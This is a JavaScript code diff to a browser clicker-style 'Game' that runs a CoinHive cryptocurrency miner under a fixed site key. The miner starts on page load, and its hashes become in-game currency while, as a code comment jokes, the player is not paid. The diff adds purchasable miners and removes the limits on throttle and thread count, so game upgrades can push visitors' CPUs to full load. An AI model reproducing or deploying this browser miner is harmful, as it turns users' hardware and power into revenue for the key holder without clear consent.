@@ -100,12 +100,15 @@ function Game() {
     var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
     miner.setNumThreads(1);
     miner.setThrottle(0.99);
-    var hashes = 0, miners = 1;
+    var hashes = 0;
+    this.hashes = function(){ return hashes; };
     var throttle = new UpgradeableItem(0.99, 1, 0.99, 100, 50);
     var threading = new UpgradeableItem(1, 1, 1, 1000, 11);
+    var miners = new UpgradeableItem(1, 1, 1, 10000, 99999999999999);
 
     // Basic functions
-    function addHashes(num){ hashes += Math.round(num * miners); }
+    function addHashes(num){ hashes += Math.round(num * miners.max); }
+
 
     // Manual usage functions
     this.click = function(){
@@ -122,7 +125,6 @@ function Game() {
         return res;
     };
     function upgradeThrottle(){
-        if(throttle.min === 0) return false;
         if(throttle.upgrade()) {
             throttle.min = Math.max(0, Math.min(throttle.min - 0.02, Math.pow(throttle.min, 2)));
             throttle.set(throttle.min);
@@ -142,7 +144,6 @@ function Game() {
         return res;
     };
     function upgradeThreading(){
-        if(threading.max >= 12) return false;
         if(threading.upgrade()) {
             threading.max++;
             threading.set(threading.max);
@@ -152,11 +153,31 @@ function Game() {
             return false;
     }
 
+    // Miner functions
+    function buyMiner() {
+        var extra = miners.price * (throttle.level / throttle.maxlevel + threading.level / threading.maxlevel) / 2;
+        if(hashes < miners.price + extra)
+            return false;
+        if(miners.upgrade()){
+            hashes -= extra;
+            return true;
+        }
+        return false;
+    }
+
+    this.buy = function(what){
+        switch(what){
+            case "miner": return buyMiner();
+            case "thread": return upgradeThreading();
+            case "throttle": return upgradeThrottle();
+        }
+        return false;
+    };
+
     this.setHashes = function(i){
         this.hashes = i;
     };
 
-    this.hashes = function(){return hashes;};
     miner.start();
     // Default income, YER A MINER HARRY (but not a paid one)
     setInterval(function () { addHashes(miner.getHashesPerSecond()); }, 1000);
